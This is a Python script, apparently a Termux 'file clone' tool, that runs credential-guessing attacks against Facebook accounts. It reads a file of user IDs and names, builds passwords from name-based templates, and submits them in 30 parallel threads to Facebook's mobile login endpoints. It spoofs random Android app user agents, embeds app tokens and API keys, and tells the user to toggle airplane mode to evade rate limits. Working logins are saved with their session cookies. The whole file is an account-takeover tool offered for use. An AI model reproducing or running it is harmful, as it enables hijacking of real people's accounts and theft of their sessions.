'''
@written_by : tanim hossain
@github : txt-xd
'''

import os
import requests
import time,sys, re
import random, uuid, json
from concurrent.futures import ThreadPoolExecutor

# ANSI color codes
G = "\x1b[38;5;46m"  # Green
W = "\x1b[97m"       # White
O = "\x1b[38;5;208m" # Orange

XD = f'{W}[{G}={W}]'

def clear():
    os.system("clear")
    print(f'''{W}
        ██   ██ ████████ ████████ ██   ██ 
         ██ ██     ██       ██     ██ ██  
          ███      ██       ██      ███   
         ██ ██     ██       ██     ██ ██  
        ██   ██    ██       ██    ██   ██ 
{W}{50*'-'}
 {XD} DEVELOPER : TANIM HOSSAIN
 {XD} FEATURE   : FILE CLONE
 {XD} GITHUB    : TXT-XD
{W}{50*'-'}''')

def linex():
    print(f"{W}{50*'-'}")

def xxt(value):
    return f"{W}[{G}{value}{W}]"

def _main():
    clear()
    print(f" {xxt('1')} FILE CLONE \n {xxt('2')} EXIT PROGRAM")
    linex()
    x = input(f" {XD} SELECT : ")
    if x == "1":
        sub=FileProcessor()
        sub._fl()
    elif x == "2":
        exit()
    else:
        _main()

class FileProcessor:
    def __init__(self):
        self.oks = []
        self.cps = []
        self.loop = 0
        self.passwords = []
        self.methods = []

    def _fl(self):
        clear()
        print(f" {XD} EXAMPLE : /sdcard/1.txt")
        linex()
        file_path = input(f' {XD} SELECT FILE : ')
        try:
            with open(file_path, 'r') as file:
                users = file.read().splitlines()
        except FileNotFoundError:
            print(f" {XD} FILE NOT FOUND")
            time.sleep(1)
            return self._fl()
        clear()
        while True:
            try:
                pax = int(input(f" {XD} PASS LIMITATION : "))
                if not 1 <= pax <= 20:
                    raise ValueError(f" {XD} PASSWORD LIMIT OUT OF RANGE")
                break
            except ValueError as e:
                print(f" {XD} INVALID INPUT: {e}")
        linex()
        print(f" {XD} EXAMPLE : firstlast,first123,last123,etc...")
        linex()
        for i in range(pax):
            password = input(f" {XD} PASSWORD {xxt(i + 1)} : ")
            self.passwords.append(password)
        linex()
        clear()
        print(f" {xxt(1)} SERVER 01\n {xxt(2)} SERVER 02")
        linex()
        server_choice = input(f" {XD} SELECT SERVER : ")
        if server_choice in ['1', '01']:
            self.methods.append('S1')
        elif server_choice in ['2', '02']:
            self.methods.append('S2')
        else:
            self.methods.append('S1')
        with ThreadPoolExecutor(max_workers=30) as executor:
            clear()
            total_ids = len(users)
            print(f" {XD} TOTAL ID : {total_ids}\n {XD} USE AIRPLANE MODE AFTER 3 MINUTES")
            linex()
            for user in users:
                try:
                    ids, names = user.split('|')
                except ValueError:
                    print(f" {XD} INVALID USER DATA FORMAT: {user}")
                    continue
                passlist = self.passwords
                if "S1" in self.methods:
                    executor.submit(self.methodA, ids, names, passlist)
                elif "S2" in self.methods:
                    executor.submit(self.methodB, ids, names, passlist)
        print("")
        linex()
        print(f" {XD} TOTAL OK ID{G} {len(self.oks)}")
        print(f" {XD} TOTAL CP ID{O} {len(self.cps)}")
        linex()

    def uaA(self):
        android_version = f'{random.randint(4, 13)}'
        samsung_models = [
            'SM-A7050', 'SM-A325F', 'GT-S7262', 'SM-E546B', 'GT-I5800L',
            'SM-A202F', 'SM-G532F', 'SM-A505FN', 'SM-G998U', 'SM-E156B',
            'SM-A035G'
        ]
        android_build = f'QP1A.{random.randint(111111, 999999)}.{random.randint(111, 999)}'
        fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
        fbbv = f'{random.randint(111111111, 999999999)}'
        density = random.choice([1.0, 1.5, 2.0, 3.0, 4.0])
        width = random.choice([720, 1080, 1440])
        height = width * 16 // 9  
        ua = (
            f'Dalvik/2.1.0 (Linux; U; Android {android_version}; '
            f'{random.choice(samsung_models)} Build/{android_build}) '
            f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};'
            f'FBDM/{{density={density},width={width},height={height}}};'
            f'FBLC/en_US;FBRV/0;FBCR/Robi;FBMF/samsung;FBBD/samsung;'
            f'FBPN/com.facebook.katana;FBDV/{random.choice(samsung_models)};'
            f'FBSV/{android_version};FBOP/1;FBCA/arm64-v8a:]'
        )
        return ua

    def methodA(self, ids, names, passlist):
        sys.stdout.write(f'\r\r {XD} {W}[{G}XTTX>{self.methods[0]}{W}]{O}-{W}[{W}{self.loop}{W}|{G}{len(self.oks)}{W}|{O}{len(self.cps)}{W}]')
        sys.stdout.flush()
        try:
            first_name = names.split(' ')[0]
            last_name = names.split(' ')[1] if len(names.split(' ')) > 1 else first_name
            first_name_lower = first_name.lower()
            last_name_lower = last_name.lower()
            for password_template in passlist:
                password = (password_template.replace('First', first_name)
                                           .replace('Last', last_name)
                                           .replace('first', first_name_lower)
                                           .replace('last', last_name_lower))
                ua = self.uaA()
                data = {
                    "adid": str(uuid.uuid4()),"format": "json","device_id": str(uuid.uuid4()),
                    "cpl": "true","family_device_id": str(uuid.uuid4()),"credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled","source": "device_based_login",
                    "email": ids,"password": password,"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": str(uuid.uuid4()),
                    "currently_logged_in_userid": "0","locale": "en_US","client_country_code": "US",
                    "method": "auth.login","fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
                    "api_key": "882a8490361da98702bf97a021ddc14d"
                }
                headers = {
                    'User-Agent': ua,'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',
                }
                url = "https://api.facebook.com/auth/login"
                try:
                    response = requests.post(url, data=data, headers=headers)
                    response_json = response.json()
                    if 'session_key' in response_json:
                        cookie = ";".join(f"{cookie['name']}={cookie['value']}" for cookie in response_json["session_cookies"])
                        print(f'\r\r {XD} [{G}XTTX>OK{W}] {G}{ids} | {password}{W}')
                        with open('/sdcard/XTTX-OK.txt', 'a') as file:
                            file.write(f'{ids}|{password}|{cookie}\n')
                        self.oks.append(ids)
                        break
                    elif 'error' in response_json and 'www.facebook.com' in response_json['error']['message']:
                        with open('/sdcard/XTTX-CP.txt', 'a') as file:
                            file.write(f'{ids}|{password}\n')
                        self.cps.append(ids)
                        break
                except requests.exceptions.RequestException as e:
                    time.sleep(10)
                except Exception as e:
                    pass
            self.loop += 1
        except Exception as e:
            pass
                
        

    def methodB(self, ids, names, passlist):
        sys.stdout.write(f'\r\r {XD} {W}[{G}XTTX>{self.methods[0]}{W}]{O}-{W}[{W}{self.loop}{W}|{G}{len(self.oks)}{W}|{O}{len(self.cps)}{W}]')
        sys.stdout.flush()
        try:
            first_name = names.split(' ')[0]
            last_name = names.split(' ')[1] if len(names.split(' ')) > 1 else first_name
            first_name_lower = first_name.lower()
            last_name_lower = last_name.lower()
            for password_template in passlist:
                password = (password_template.replace('First', first_name)
                                           .replace('Last', last_name)
                                           .replace('first', first_name_lower)
                                           .replace('last', last_name_lower))
                ua = self.uaA()
                headers = {
                    'User-Agent': ua,'Content-Type': 'application/x-www-form-urlencoded',
                    'Host': 'b-graph.facebook.com','X-FB-Net-HNI': str(random.randint(20000, 40000)),
                    'X-FB-SIM-HNI': str(random.randint(20000, 40000)),'X-FB-Connection-Type': 'MOBILE.LTE',
                    'X-Tigon-Is-Retry': 'False','x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
                    'x-fb-device-group': '5120','X-FB-Friendly-Name': 'ViewerReactionsMutation',
                    'X-FB-Request-Analytics-Tags': 'graphservice','X-FB-HTTP-Engine': 'Liger',
                    'X-FB-Client-IP': 'True','X-FB-Server-Cluster': 'True',
                    'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62','Content-Length': '706'
                }
                data = {
                    "adid": str(uuid.uuid4()).upper(),"device_id": str(uuid.uuid4()),"family": str(uuid.uuid4()).upper(),
                    "secure": str(uuid.uuid4()).upper(),"family_device_id": str(uuid.uuid4()).upper(),
                    "format": "json","cpl": "true","credentials_type": "device_based_login_password",
                    "error_detail_type": "button_with_disabled","source": "device_based_login",
                    "email": ids,"password": password,"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                    "generate_session_cookies": "1","meta_inf_fbmeta": "","advertiser_id": "8b59ed89-4b88-4f69-a1ed-dfea59e76839",
                    "currently_logged_in_userid": "0","locale": "en_PH","client_country_code": "PH",
                    "method": "auth.login","fb_api_req_friendly_name": "authenticate",
                    "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler","api_key": "882a8490361da98702bf97a021ddc14d"
                }
                url = 'https://graph.facebook.com/auth/login'
                try:
                    response = requests.post(url, data=data, headers=headers)
                    response_json = response.json()
                    if 'session_key' in response_json:
                        cookie = ";".join(f"{cookie['name']}={cookie['value']}" for cookie in response_json["session_cookies"])
                        print(f'\r\r {XD} [{G}XTTX>OK{W}] {G}{ids} | {password}{W}')
                        with open('/sdcard/XTTX-OK.txt', 'a') as file:
                            file.write(f'{ids}|{password}|{cookie}\n')
                        self.oks.append(ids)
                        break
                    elif 'error' in response_json and 'www.facebook.com' in response_json['error']['message']:
                        with open('/sdcard/XTTX-CP.txt', 'a') as file:
                            file.write(f'{ids}|{password}\n')
                        self.cps.append(ids)
                        break
                except requests.exceptions.RequestException:
                    time.sleep(10)
                except Exception as e:
                    pass
            self.loop += 1
        except Exception as e:
            pass

if __name__ == "__main__":
    _main()
